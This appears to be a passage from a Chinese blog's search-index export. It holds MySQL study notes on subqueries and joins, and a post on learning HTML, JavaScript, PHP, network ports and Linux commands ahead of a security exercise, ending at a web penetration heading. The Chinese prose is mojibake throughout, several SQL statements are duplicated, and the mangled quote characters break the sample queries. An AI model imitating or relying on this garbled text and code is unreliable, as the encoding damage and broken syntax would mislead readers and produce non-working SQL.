tbl2);</p><p>è¿”å›tbl2è¡¨çš„æ‰€æœ‰num2åˆ—ï¼Œç„¶åå°†tbl1ä¸­çš„num1çš„å€¼ä¸ä¹‹è¿›è¡Œæ¯”è¾ƒï¼Œåªè¦å¤§äºnum2çš„ä»»ä½•1ä¸ªå€¼ï¼Œå³ä¸ºç¬¦åˆæŸ¥è¯¢æ¡ä»¶çš„ç»“æœã€‚</p><p> SELECT num1 FROM tbl1 WHERE num1 &gt; ANY (SELECT num2 FROM tbl2);</p><p>è¿”å›tbl1è¡¨ä¸­æ¯”tbl2è¡¨num2 åˆ—æ‰€æœ‰å€¼éƒ½å¤§çš„å€¼ï¼ŒSQLè¯­å¥å¦‚ä¸‹ï¼š</p><p> SELECT num1 FROM tbl1 WHERE num1 &gt; ALL (SELECT num2 FROM tbl2);</p><p>è¿”å›tbl1è¡¨ä¸­æ¯”tbl2è¡¨num2 åˆ—æ‰€æœ‰å€¼éƒ½å¤§çš„å€¼ï¼ŒSQLè¯­å¥å¦‚ä¸‹ï¼š</p><p> SELECT num1 FROM tbl1 WHERE num1 &gt; ALL (SELECT num2 FROM tbl2);</p><p>ä¸‰ã€è‡ªè¿æ¥</p><p>create table tb_user2</p><p>(</p><p>uid char(10) not null primary key,</p><p>username nvarchar(20) not null,</p><p>usersex char(2),</p><p>userage int</p><p>);</p><p>insert into tb_user2(uid,username,usersex,userage) </p><p>values(â€˜u1001â€™,â€™å¼ å°æ˜â€™,â€™ç”·â€™,30),(â€˜u1002â€™,â€™æåâ€™,â€™ç”·â€™,34),(â€˜u1003â€™,â€™æå°çº¢â€™,â€™å¥³â€™,32),(â€˜u1004â€™,â€™å¼ å¤©æµ©â€™,â€™ç”·â€™,40),(â€˜u1005â€™,â€™ææ´â€™,â€™å¥³â€™,29),(â€˜u1006â€™,â€™é»„ç»´â€™,â€™å¥³â€™,33),(â€˜u1007â€™,â€™ä½™æ˜æ°â€™,â€™ç”·â€™,25);</p><p>ä¾‹ï¼šä½¿ç”¨è‡ªè¿æ¥ï¼Œå°†å‘˜å·¥è¡¨çš„ç”·æ€§ä¸æ¯ä¸€ä¸ªå¥³æ€§è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶æ±‚å‡ºå¹´é¾„å·®ã€‚</p><p>å°†ä¸€ä¸ªè¡¨ä¸­ç¬¦åˆæŸä¸€æ¡ä»¶çš„è¡Œä¸åŒä¸€ä¸ªè¡¨ä¸­å¦å¤–ä¸€äº›è¡Œè¿›è¡Œæ¯”è¾ƒï¼Œè¿æ¥æ¡ä»¶æ˜¯æ€§åˆ«ä¸åŒã€‚æ–°å»ºä¸€ä¸ªè¡¨tb_user2ï¼Œè®¾ç½®æ€§åˆ«åˆ—ã€‚</p><p>Select m.username,m.usersex,g.username,g.usersex,g.userage-m.userage from tb_user2 g inner join tb_user2 m on g.usersex&lt;&gt;m.usersex;</p><p>Select m.username,m.usersex,g.username,g.usersex,g.userage-m.userage from tb_user2 g inner join tb_user2 m on g.usersex&lt;&gt;m.usersex where g.userage-m.userage in (2,3,4,-2,-3,-4);</p><p>Select m.username,m.usersex,g.username,g.usersex,g.userage-m.userage from tb_user2 g inner join tb_user2 m on g.usersex&lt;&gt;m.usersex;</p><p>Select m.username,m.usersex,g.username,g.usersex,g.userage-m.userage from tb_user2 g inner join tb_user2 m on g.usersex&lt;&gt;m.usersex where g.userage-m.userage in (2,3,4,-2,-3,-4);</p><p>ç¬¬å››éƒ¨åˆ†</p><p>å¤šè¡¨è¿æ¥ç»ƒä¹ ï¼š</p><p>æ–°å»ºæ•°æ®åº“ dblx1ï¼Œå»ºç«‹3ä¸ªæ•°æ®è¡¨</p><p>create database dblx1;</p><p>use dblx1;</p><p>å»ºç«‹æ•°æ®è¡¨staff  </p><p>create table staff(</p><p>staff_id int(10) unsigned not null auto_increment,</p><p>section_id int(10) unsigned not null,</p><p>positions_id int(10) not null,</p><p>name varchar(10) not null,</p><p>sex enum(â€˜ç”·â€™,â€™å¥³â€™) not null,</p><p>phone_number char(11) not null,</p><p>money decimal(10,2)  unsigned not null default â€˜0.00â€™,</p><p>entry_date datetime not null,</p><p>primary key(staff_id)</p><p>);</p><p>insert into staff(staff_id,section_id,positions_id,name,sex,phone_number,money,entry_date)</p><p>values(1,â€™1â€™,â€™1â€™,â€™åˆ˜é•¿ç”Ÿâ€™,â€™ç”·â€™,â€™13753697300â€™,20000,â€™2018-04-02 14:35:52â€™),(2,â€™1â€™,â€™2â€™,â€™èµµéœâ€™,â€™å¥³â€™,â€™13753697301â€™,10000,â€™2018-04-02 14:40:52â€™),(3,â€™2â€™,â€™3â€™,â€™å­£åº†å¥‡â€™,â€™å¥³â€™,â€™13753697302â€™,15000,â€™2018-04-02 14:43:52â€™),(4,â€™3â€™,â€™3â€™,â€™ææ˜Ÿå®‡â€™,â€™ç”·â€™,â€™13753697303â€™,15000,â€™2018-04-02 14:45:52â€™),(5,â€™4â€™,â€™3â€™,â€™å¼ å‘é˜³â€™,â€™ç”·â€™,â€™13753697304â€™,15000,â€™2018-04-02 14:47:24â€™),(6,â€™4â€™,â€™8â€™,â€™å¼ æ—­â€™,â€™ç”·â€™,â€™13753697305â€™,10000,â€™2018-04-02 14:50:52â€™);</p><p>insert into staff(staff_id,section_id,positions_id,name,sex,phone_number,money,entry_date)</p><p>values(7,â€™1â€™,â€™8â€™,â€™å­™ä¼Ÿâ€™,â€™ç”·â€™,â€™13711697211â€™,25000,â€™2019-04-02 14:35:52â€™);</p><p>create table section(</p><p>section_id int(10) unsigned not null auto_increment,</p><p>section_title varchar(20) not null,</p><p>primary key(section_id)</p><p>);</p><p>insert into section(section_id,section_title) values(1,â€™æ€»ç»åŠâ€™),(2,â€™è´¢åŠ¡éƒ¨â€™),(3,â€™é”€å”®éƒ¨â€™),(4,â€™ç ”å‘éƒ¨â€™),(5,â€™è¿è¥éƒ¨â€™),(6,â€™äººåŠ›èµ„æºéƒ¨â€™),(7,â€™å”®åæœåŠ¡éƒ¨â€™);</p><p>1.åœ¨staffè¡¨å’Œsectionè¡¨ä¹‹é—´ä½¿ç”¨å†…è¿æ¥æŸ¥è¯¢ï¼Œä»staffè¡¨ä¸­æŸ¥è¯¢staff_idï¼ˆå‘˜å·¥idï¼‰ã€name(å§“å)ã€sexï¼ˆæ€§åˆ«ï¼‰ã€phone_numberï¼ˆæ‰‹æœºå·ï¼‰ï¼Œ ä»sectionè¡¨ä¸­æŸ¥è¯¢section_titleï¼ˆéƒ¨é—¨åç§°ï¼‰ã€‚</p><p>select staff_id,name,sex,section_title,phone_number from staff inner join section on staff.section_id=section.section_id;</p><p>æ³¨æ„ï¼šselectåé¢æŒ‡å®šçš„åˆ—åˆ†åˆ«å±äºä¸¤ä¸ªä¸åŒçš„è¡¨ï¼›åŒæ—¶ï¼Œfromå­å¥åˆ—å‡ºäº†ä¸¤ä¸ªè¡¨ï¼Œä¸¤ä¸ªè¡¨ä¹‹é—´çš„å…³ç³»é€šè¿‡inner joinæŒ‡å®šï¼Œè¿æ¥æ¡ä»¶ä½¿ç”¨onå­å¥ç»™å‡ºã€‚</p><p>ä½¿ç”¨whereå­å¥ä¹Ÿå¯ä»¥ç»™å‡ºè¿æ¥æ¡ä»¶ï¼Œå°†è¿”å›ä¸ä¸Šä¸€æ¡å‘½ä»¤å®Œå…¨ç›¸åŒçš„ç»“æœã€‚</p><p>select staff_id,name,sex,section_title,phone_number from staff ,section where staff.section_id=section.section_id;</p><p>2.ä½¿ç”¨å†…è¿æ¥æŸ¥è¯¢ ï¼Œä»staffè¡¨ä¸­æŸ¥è¯¢è–ªèµ„ä½äº15000çš„å‘˜å·¥çš„staff_id(å‘˜å·¥id)ã€name(å§“å)ã€money(è–ªèµ„)ã€‚</p><p>select s1.staff_id,s1.name,s2.money from staff as s1 inner join staff as s2 on s1.staff_id=s2.staff_id and s2.money&lt;15000;</p><p>3.åœ¨staffè¡¨å’Œsectionè¡¨ä¸­ï¼Œæ‰§è¡Œå†…è¿æ¥æŸ¥è¯¢è¯­å¥ï¼ŒæŸ¥è¯¢sectionè¡¨ä¸­éƒ¨é—¨åç§°ä¸ºâ€œæ€»ç»åŠâ€çš„å‘˜å·¥idã€å§“åã€æ€§åˆ«å’Œç”µè¯å·ç ç­‰ä¿¡æ¯ã€‚</p><p>use staff</p><p>select staff_id,name,sex,section_title,phone_number from staff inner join section on staff.section_id=section.section_id where section.section_title=â€™æ€»ç»åŠâ€™;</p><p>select staff_id,name,sex,section_title,phone_number from staff inner join section on staff.section_id=section.section_id;</p><p>å¤–è¿æ¥æŸ¥è¯¢ ï¼ˆouter joinï¼‰æ˜¯ä»¥ä¸€å¼ è¡¨ä¸ºåŸºè¡¨ï¼Œæ ¹æ®è¿æ¥æ¡ä»¶ï¼Œä¸å¦å¤–ä¸€å¼ è¡¨çš„æ¯ä¸€è¡Œè¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœæ²¡æœ‰åŒ¹é…ä¸Šï¼Œåˆ™åœ¨ç›¸å…³è”çš„ç»“æœè¡Œä¸­ï¼Œå¦ä¸€å¼ è¡¨çš„æ‰€æœ‰é€‰æ‹©åˆ—å‡è¿”å›ç©ºå€¼ã€‚</p><p>å¤–è¿æ¥æŸ¥è¯¢é€šå¸¸åˆ†ä¸ºä¸¤ç§ï¼šå·¦è¿æ¥æŸ¥è¯¢ï¼ˆleft joinï¼‰å’Œå³è¿æ¥æŸ¥è¯¢ï¼ˆright joinï¼‰ã€‚</p><p>ä»¥goodsè¡¨å’Œordersè¡¨</p><p>create table orders(</p><p>o_id int(11) primary key,</p><p>add_time datetime,</p><p>goods_id int(11)</p><p>);</p><p>insert into orders(o_id,add_time,goods_id) values(1,â€™2018-04-02 14:35:52â€™,6),(2,â€™2018-04-03 14:40:52â€™,1),(3,â€™2018-04-03 14:45:52â€™,5),(4,â€™2018-04-03 14:35:52â€™,1),(5,â€™2018-04-03 14:47:24â€™,15),(6,â€™2018-04-03 14:50:52â€™,4);</p><p>create table goods(</p><p>id int(11) primary key  auto_increment,</p><p>type varchar(30) not null,</p><p>name varchar(30) unique,</p><p>price decimal(7,2)  unsigned,</p><p>num int(11) default 0,</p><p>add_time datetime</p><p>);</p><p>insert into goods(id,type,name,price,num,add_time) values(1,â€™ä¹¦ç±â€™,â€™è¥¿æ¸¸è®°â€™,50.4,20,â€™2018-01-01 13:40:40â€™);</p><p>insert into goods(id,type,name,price,num,add_time) values(2,â€™ä¹¦ç±â€™,â€æ°´æµ’ä¼ â€,60.5,20,â€2019-02-02 19:40:40â€);</p><p>insert into goods values(3,â€™ä¹¦ç±â€™,â€çº¢æ¥¼æ¢¦â€,70.2,20,â€2020-03-03 9:10:30â€);</p><p>insert into goods(id,type,name,price,num,add_time) values(5,â€™æœé¥°â€™,â€ä¼‘é—²è¥¿æœâ€,800,null,â€2019-04-04 13:40:40â€),</p><p>(6,â€™é¥®å“â€™,â€æœæ±â€,3,70,â€2019-05-05 13:40:40â€),</p><p>(7,â€™ä¹¦ç±â€™,â€è®ºè¯­â€,109,50,â€2019-06-06 13:40:40â€),</p><p>(8,â€™ä¹¦ç±â€™,â€æ•°æ®åº“â€,35,2,â€2020-02-02 19:40:40â€);</p><p>3.å·¦å¤–è¿æ¥æŸ¥è¯¢</p><p>åœ¨å¤–è¿æ¥æŸ¥è¯¢è¯­å¥ä¸­ï¼Œleft joinå…³é”®å­—ä¹‹å‰çš„è¡¨ç§°ä¸ºå·¦è¡¨ï¼Œå·¦è¿æ¥æŸ¥è¯¢ä¼šä»¥å·¦è¡¨ä¸ºåŸºè¡¨ï¼Œä¸å¦å¤–ä¸€å¼ è¡¨çš„æ¯ä¸€è¡Œè¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœç¬¦åˆè¿æ¥æ¡ä»¶ï¼Œåˆ™è¿”å›ä¸¤å¼ è¡¨ç›¸å¯¹åº”çš„è¡Œï¼›å¦‚æœä¸ç¬¦åˆï¼Œåˆ™åªè¿”å›å·¦è¡¨ä¸­çš„è¡Œï¼Œå¹¶ä¸”å…¶å¯¹åº”çš„è¡Œä¸ºä¸€ä¸ªç©ºå€¼ã€‚</p><p>æ‰§è¡Œå·¦è¿æ¥æŸ¥è¯¢ï¼ŒæŸ¥è¯¢goodsè¡¨ä¸­å“ªäº›å•†å“æœ‰è®¢å•ï¼Œå“ªäº›å•†å“æ²¡æœ‰è®¢å•ã€‚</p><p>select goods.id,goods.name,orders.o_id  from goods left join orders on goods.id=orders.goods_id;</p><p>4.åœ¨goodsè¡¨å’Œordersè¡¨ä¸­æŸ¥è¯¢å“ªäº›å•†å“æœ‰è®¢å•ï¼Œå“ªäº›å•†å“æ²¡æœ‰è®¢å•ï¼Œå¹¶ä½¿ç”¨å•†å“IDå·å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œæ’åºã€‚</p><p>use db_shop;</p><p>select goods.id,goods.name,orders.o_id from goods left join orders on goods.id=orders.goods_id order by goods.id;</p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºHWå‰çš„å­¦ä¹ </title>
      <link href="/2021/03/19/hua-meng-xue-yuan/"/>
      <url>/2021/03/19/hua-meng-xue-yuan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1297742167&auto=1&height=66"></iframe><h1 id="1-å‰ç«¯åŸºç¡€"><a href="#1-å‰ç«¯åŸºç¡€" class="headerlink" title="1.å‰ç«¯åŸºç¡€"></a>1.å‰ç«¯åŸºç¡€</h1><h2 id="1-HTMLé™æ€é¡µé¢åŸºç¡€è¯¾"><a href="#1-HTMLé™æ€é¡µé¢åŸºç¡€è¯¾" class="headerlink" title="1.HTMLé™æ€é¡µé¢åŸºç¡€è¯¾"></a>1.HTMLé™æ€é¡µé¢åŸºç¡€è¯¾</h2><pre><code>&lt;strong&gt;&lt;/strong&gt;åŠ ç²—</code></pre><p>è¡¨æ ¼æ ‡ç­¾ï¼š</p><pre><code>&lt;tr&gt;&lt;/tr&gt;è¡¨ç¤ºä¸€è¡Œ&lt;td&gt;&lt;/td&gt;è¡¨ç¤ºä¸€è¡Œä¸­çš„å†…å®¹</code></pre><p>tdä¸­å«æœ‰å±æ€§ï¼šå±…ä¸­å¯¹é½ç­‰</p><p>tableä¸­å«æœ‰å•å…ƒæ ¼é—´è·å’Œå¡«å……ï¼Œåˆå¹¶å•å…ƒæ ¼ç­‰ã€‚ã€‚</p><p>åˆ—è¡¨æ ‡ç­¾ï¼š</p><p><a href="http://t.mb5u.com/html/detail/detail_input.html" target="_blank" rel="noopener">è¡¨å•æ ‡ç­¾ï¼š</a></p><p>ä½œä¸šï¼š99ä¹˜æ³•è¡¨</p><h2 id="2-HTMLé™æ€å¼€å‘"><a href="#2-HTMLé™æ€å¼€å‘" class="headerlink" title="2.HTMLé™æ€å¼€å‘"></a>2.HTMLé™æ€å¼€å‘</h2><pre><code>&lt;p&gt;&lt;/p&gt;æ®µè½æ ‡ç­¾å…¶å¯ä»¥ä¸åŠ ç²—ï¼Œå€¾æ–œï¼Œåˆ é™¤çº¿ï¼Œä¸‹åˆ’çº¿ç»“åˆä½¿ç”¨&lt;div&gt;&lt;/div&gt;ä¸€èˆ¬ç”¨äºå­˜æ”¾å›¾ç‰‡ï¼Œæ–‡å­—ï¼Œè§†é¢‘ç­‰ç½‘é¡µå†…å®¹ï¼Œå¯ä»¥ä»¥ç†è§£ä¸ºä¸€ä¸ªç›’å­ï¼Œå¯ä»¥å­˜æ”¾ä¸€åˆ‡ä¸œè¥¿&lt;span&gt;&lt;/span&gt;ä¸ä¸Šé¢ä¸åŒçš„æ˜¯å®ƒåªå¯ä»¥å­˜æ”¾æ–‡å­—&lt;img /&gt;æŒ‡å®šå›¾åƒæ–‡ä»¶</code></pre><p><a href="https://www.webhek.com/post/html-enerty-code.html" target="_blank" rel="noopener">ç‰¹æ®Šå­—ç¬¦ </a></p><h2 id="3-CSSå±‚å æ ·å¼å¼€å‘"><a href="#3-CSSå±‚å æ ·å¼å¼€å‘" class="headerlink" title="3.CSSå±‚å æ ·å¼å¼€å‘"></a>3.CSSå±‚å æ ·å¼å¼€å‘</h2><h2 id="5-JavascriptåŸºç¡€"><a href="#5-JavascriptåŸºç¡€" class="headerlink" title="5.JavascriptåŸºç¡€"></a>5.JavascriptåŸºç¡€</h2><p>windows.alert()å¼¹å‡ºè­¦å‘Šæ¡†</p><p>document.write()å°†æ–¹æ³•å†™å…¥åˆ°HTMLæ–‡æ¡£ä¸­</p><p>innerHTMLå†™å…¥åˆ°HTMLå…ƒç´ </p><p>ä½¿ç”¨console.log()å†™å…¥åˆ°æµè§ˆå™¨çš„æ§åˆ¶å°(console.logå¯ä»¥ä½¿æƒ³è¦çš„å†…å®¹åœ¨æ§åˆ¶å°è¾“å‡º)</p><p>åœ¨ä½¿ç”¨æ—¶éœ€è¦å°†å…¶åˆ°åŠ å…¥</p><pre><code>&lt;script&gt;&lt;/script&gt;</code></pre><p>æ ‡ç­¾</p><h2 id="6-Javascriptå¯¹è±¡ä¸äº‹ä»¶"><a href="#6-Javascriptå¯¹è±¡ä¸äº‹ä»¶" class="headerlink" title="6.Javascriptå¯¹è±¡ä¸äº‹ä»¶"></a>6.Javascriptå¯¹è±¡ä¸äº‹ä»¶</h2><p><a href="http://c.biancheng.net/view/5944.html" target="_blank" rel="noopener">jsé¼ æ ‡äº‹ä»¶</a></p><p><a href="https://www.jianshu.com/p/dbbd31eb5b26" target="_blank" rel="noopener">è¡¨å•ç›¸å…³äº‹ä»¶</a></p><p><a href="https://blog.csdn.net/smartsmile2012/article/details/53940331" target="_blank" rel="noopener">JSé¼ æ ‡äº‹ä»¶ã€HTMLé¡µé¢äº‹ä»¶å¤§å…¨</a></p><p>å…³äºonfocusè·å–ç„¦ç‚¹äº‹ä»¶å¯ä»¥ç”¨æ¥é˜²å¾¡å¯¹è¾“å…¥æ¡†è¿›è¡Œæ”»å‡»çš„æ—¶å€™çš„ä½¿ç”¨ï¼Œä¿è¯å‡ºç°æ— é™å¼¹çª—</p><h1 id="2-PHPè¯¾ç¨‹"><a href="#2-PHPè¯¾ç¨‹" class="headerlink" title="2.PHPè¯¾ç¨‹"></a>2.PHPè¯¾ç¨‹</h1><h2 id="1-phpè¿ç®—"><a href="#1-phpè¿ç®—" class="headerlink" title="1.phpè¿ç®—"></a>1.phpè¿ç®—</h2><p>1.åè¿›åˆ¶decäºŒè¿›åˆ¶binå…«è¿›åˆ¶octåå…­è¿›åˆ¶hex</p><pre><code>echo decbin(123);//åè¿›åˆ¶è½¬äºŒè¿›åˆ¶ä¾æ¬¡ç±»æ¨å³å¯</code></pre><p>2.â€™ â€˜ä¸â€ â€œçš„åŒºåˆ«ï¼šå‰è€…å†…å®¹åŒ…è£¹çš„æ˜¯çº¯çº¯çš„å­—ç¬¦ä¸²ï¼Œè€Œåè€…ä¸­å¯ä»¥åŒ…è£¹çš„æœ‰å˜é‡</p><p>3.é”™è¯¯æŠ‘åˆ¶ç¬¦@ï¼šåœ¨å·²çŸ¥ä¸€äº›é”™è¯¯ä¼šæŠ¥é”™ï¼Œä½†æ˜¯ä¸æƒ³è®©ä»–æŠ¥é”™ï¼Œå°±ç”¨åˆ°äº†é”™è¯¯æŠ‘åˆ¶ç¬¦ï¼ˆ@ï¼‰</p><h2 id="2-PHPå¾ªç¯"><a href="#2-PHPå¾ªç¯" class="headerlink" title="2.PHPå¾ªç¯"></a>2.PHPå¾ªç¯</h2><ul><li>forå¾ªç¯ï¼šé€šè¿‡å¤©å‰‘ã€èµ·å§‹å’Œç»ˆæ­¢åˆ¤æ–­æ‰§è¡Œ</li><li>whileå¾ªç¯ï¼šé€šè¿‡åˆ¤æ–­æ¡ä»¶ç»ˆæ­¢</li><li>do-whileï¼šè·Ÿwhileå·®ä¸å¤š</li><li>foreachå¾ªç¯ï¼šä¸“é—¨é’ˆå¯¹æ•°ç»„</li></ul><p>forå¾ªç¯ä¹‹æ­»å¾ªç¯ï¼š</p><pre><code>æ— å¢é‡ï¼Œæ¡ä»¶æ°¸è¿œä¸ºçœŸï¼š&lt;?phpfor($i=1;$i&lt;10;){}åªè¦æ²¡æœ‰æ¡ä»¶éƒ½æ˜¯æ­»å¾ªç¯ï¼š&lt;?phpfor($i=1;;$i++){}æ— æ¡ä»¶æ— å¢é‡&lt;?phpfor(;;){}</code></pre><h2 id="3-PHPå‡½æ•°æ–‡ä»¶ä¸Šä¼ "><a href="#3-PHPå‡½æ•°æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="3.PHPå‡½æ•°æ–‡ä»¶ä¸Šä¼ "></a>3.PHPå‡½æ•°æ–‡ä»¶ä¸Šä¼ </h2><p>è¢«ä¼ å…¥çš„å‚æ•°ç§°ä¸ºå®å‚</p><p>$_FILESåœ¨PHPä¸­ï¼Œæ˜¯ä¸€ä¸ªé¢„å®šä¹‰å˜é‡ï¼Œä¸“é—¨ç”¨æ¥å‚¨å­˜ä¸Šä¼ çš„æ–‡ä»¶</p><h2 id="4-PHPé¢å‘å¯¹è±¡å‘½åç©ºé—´"><a href="#4-PHPé¢å‘å¯¹è±¡å‘½åç©ºé—´" class="headerlink" title="4.PHPé¢å‘å¯¹è±¡å‘½åç©ºé—´"></a>4.PHPé¢å‘å¯¹è±¡å‘½åç©ºé—´</h2><p>ç±»å¸¸é‡ï¼ˆåœ¨ç±»ä¸­å®šä¹‰å¸¸é‡ï¼‰çš„å®šä¹‰åªèƒ½ä½¿ç”¨ä¸€ç§æ–¹å¼ï¼šconst å¸¸é‡å= å€¼ï¼›</p><p>å‘½åç©ºé—´ï¼š</p><p>é¿å…å‡ºç°ç›¸åŒç»“æ„è€Œé€ æˆçš„å†²çªï¼Œæ¯”å¦‚ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹é¢ä¸èƒ½æœ‰ä¸¤ä¸ª1.phpï¼Œæ‰€ä»¥éœ€è¦å»ºä¸¤ä¸ªç©ºé—´ï¼Œè¿™æ ·é‡åçš„è¯å°±ä¸ä¼šæŠ¥é”™ï¼Œå®šä¹‰å‘½åç©ºé—´çš„æ—¶å€™å…¶å‰é¢æ˜¯ä¸èƒ½æœ‰ä»£ç çš„</p><h2 id="5-PHPæ•°æ®åº“"><a href="#5-PHPæ•°æ®åº“" class="headerlink" title="5.PHPæ•°æ®åº“"></a>5.PHPæ•°æ®åº“</h2><p>MySQLè¿æ¥åªé™äºphp7ç‰ˆæœ¬ä»¥ä¸‹</p><h2 id="6-phpå¼€å‘å°å®ä¾‹"><a href="#6-phpå¼€å‘å°å®ä¾‹" class="headerlink" title="6.phpå¼€å‘å°å®ä¾‹"></a>6.phpå¼€å‘å°å®ä¾‹</h2><h1 id="3-WEBæ¸—é€ç²¾è‹±ç­è¯¾ç¨‹"><a href="#3-WEBæ¸—é€ç²¾è‹±ç­è¯¾ç¨‹" class="headerlink" title="3.WEBæ¸—é€ç²¾è‹±ç­è¯¾ç¨‹"></a>3.WEBæ¸—é€ç²¾è‹±ç­è¯¾ç¨‹</h1><h2 id="1-åŸºç¡€ç¯‡è¯¾ç¨‹-æ‰«ç›²è¯¾"><a href="#1-åŸºç¡€ç¯‡è¯¾ç¨‹-æ‰«ç›²è¯¾" class="headerlink" title="1.åŸºç¡€ç¯‡è¯¾ç¨‹(æ‰«ç›²è¯¾)"></a>1.åŸºç¡€ç¯‡è¯¾ç¨‹(æ‰«ç›²è¯¾)</h2><ul><li><h3 id="è®¡ç®—æœºç»„æˆä¸DOSå‘½ä»¤"><a href="#è®¡ç®—æœºç»„æˆä¸DOSå‘½ä»¤" class="headerlink" title="è®¡ç®—æœºç»„æˆä¸DOSå‘½ä»¤"></a>è®¡ç®—æœºç»„æˆä¸DOSå‘½ä»¤</h3></li></ul><h4 id="å¸¸è§çš„åè®®ä¸ç«¯å£ï¼š"><a href="#å¸¸è§çš„åè®®ä¸ç«¯å£ï¼š" class="headerlink" title="å¸¸è§çš„åè®®ä¸ç«¯å£ï¼š"></a>å¸¸è§çš„åè®®ä¸ç«¯å£ï¼š</h4><p>21/tcp FTP æ–‡ä»¶ä¼ è¾“åè®®ï¼›25 SMTPï¼›69/udp ç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼›110/tcp pop3é‚®ä»¶æ¥æ”¶ï¼›443 HTTPS å®‰å…¨çš„HTTPï¼ˆåŠ å¯†ä¼ è¾“ï¼‰ï¼›3389/rdp è¿œç¨‹è¿æ¥ è¿œç¨‹æ¡Œé¢ï¼›445/smb æ–‡ä»¶å…±äº«ï¼›3306 MySQLæ•°æ®åº“ï¼›1521 Oracleæ•°æ®åº“ï¼›</p><h4 id="å¸¸è§çš„doså‘½ä»¤"><a href="#å¸¸è§çš„doså‘½ä»¤" class="headerlink" title="å¸¸è§çš„doså‘½ä»¤"></a><a href="https://wenku.baidu.com/view/8ffad7a9dd3383c4bb4cd29a.html" target="_blank" rel="noopener">å¸¸è§çš„doså‘½ä»¤</a></h4><ul><li><h3 id="è®¡ç®—æœºç½‘ç»œåŸºç¡€"><a href="#è®¡ç®—æœºç½‘ç»œåŸºç¡€" class="headerlink" title="è®¡ç®—æœºç½‘ç»œåŸºç¡€"></a>è®¡ç®—æœºç½‘ç»œåŸºç¡€</h3></li></ul><p><a href="https://blog.csdn.net/yaopeng_2005/article/details/7064869" target="_blank" rel="noopener">osiä¸ƒå±‚æ¨¡å‹ï¼š</a></p><p><a href="https://blog.csdn.net/ffsiwei/article/details/82121010" target="_blank" rel="noopener">tcp/ipäº”å±‚æ¨¡å‹ï¼š</a></p><p><a href="https://blog.csdn.net/qq_30553235/article/details/79282113" target="_blank" rel="noopener">å¸¸ç”¨çš„HTTPè¯·æ±‚å¤´ä¸å“åº”å¤´</a></p><ul><li><h3 id="é¶åœºç¯å¢ƒæ­å»º"><a href="#é¶åœºç¯å¢ƒæ­å»º" class="headerlink" title="é¶åœºç¯å¢ƒæ­å»º"></a>é¶åœºç¯å¢ƒæ­å»º</h3></li></ul><p><a href="https://blog.csdn.net/m0_46575550/article/details/106576158" target="_blank" rel="noopener">è¦æ±‚ç»™ä½ ä¸€ä¸ªç½‘ç«™ï¼Œéœ€è¦äº†è§£åˆ°è¿™ä¸ªç½‘ç«™çš„ä¸€äº›é…ç½®</a></p><ul><li><h3 id="Linuxä½¿ç”¨ï¼ˆreviewï¼‰"><a href="#Linuxä½¿ç”¨ï¼ˆreviewï¼‰" class="headerlink" title="Linuxä½¿ç”¨ï¼ˆreviewï¼‰"></a>Linuxä½¿ç”¨ï¼ˆreviewï¼‰</h3></li></ul><p><a href="https://www.runoob.com/linux/linux-command-manual.html" target="_blank" rel="noopener">Linuxå‘½ä»¤å¤§å…¨</a></p><p><a href="https://blog.csdn.net/qq_36802111/article/details/82177844" target="_blank" rel="noopener">Linuxå¸¸ç”¨å‘½ä»¤å¤§å…¨+è¯¦è§£</a></p><p>find grep</p><p>uptime</p><p><strong>è¿›ç¨‹ä¿¡æ¯æŸ¥çœ‹ï¼š</strong></p><pre><code>ps auxæš‚æ—¶çš„æŸ¥çœ‹å½“å‰cpuçš„ä½¿ç”¨ç‡ps topåŠ¨æ€çš„æŸ¥çœ‹kill [-9] [è¿›ç¨‹ä»£å·]ï¼š-9è¡¨ç¤ºå¼ºè¡Œåˆ é™¤</code></pre><p>mkdir (file)ï¼šåˆ›å»ºä¸€ä¸ªæ–‡æœ¬å¤¹</p><p>touch åˆ›å»ºtxtæ–‡ä»¶</p><p>dirï¼šæŸ¥çœ‹å½“å‰çš„ç›®å½•</p><p>ls -laï¼šæŸ¥çœ‹å½“å‰æ–‡ä»¶å¹¶æ›´å¤šä¿¡æ¯ï¼ˆå¦‚ï¼šæ–‡ä»¶æ‰€è¢«ç»™äºˆçš„æƒé™ï¼‰</p><p>rm <file>ï¼š-rfå¼ºè¡Œåˆ é™¤æ–‡ä»¶</file></p><p>rmdirï¼ˆè‹±æ–‡å…¨æ‹¼ï¼šremove directoryï¼‰ï¼šåˆ é™¤ä¸€ä¸ªç©ºçš„ç›®å½•</p><p>tar -cvf 1.tar 1.txt ï¼šæ‰“åŒ…1.txtæ–‡ä»¶</p><p>tar -xvf 1.tar 1.txt ï¼šè§£åŒ…</p><p>gzipè¡¨ç¤ºå‹ç¼©ï¼Œä¸tarå‘½ä»¤ç»“åˆä½¿ç”¨ï¼šä¾‹å¦‚-zxvfï¼ŒåŒæ—¶æ‰“åŒ…æ–‡ä»¶.tar.gz</p><ul><li><h3 id="kaliçš„å®‰è£…ä¸é…ç½®"><a href="#kaliçš„å®‰è£…ä¸é…ç½®" class="headerlink" title="kaliçš„å®‰è£…ä¸é…ç½®"></a>kaliçš„å®‰è£…ä¸é…ç½®</h3></li></ul><h2 id="2-WEBæ¸—é€ç¯‡"><a href="#2-WEBæ¸—é€ç¯‡" class="headerlink" title="2.WEBæ¸—é€ç¯‡"></a>2.WEBæ¸—é€ç¯‡</h2><ul><li><h3 id="ç½‘ç»œå®‰å…¨ä¸æ¸—é€æµ‹è¯•æµç¨‹"><a href="#ç½‘ç»œå®‰å…¨ä¸æ¸—é€æµ‹è¯•æµç¨‹" class="headerlink" 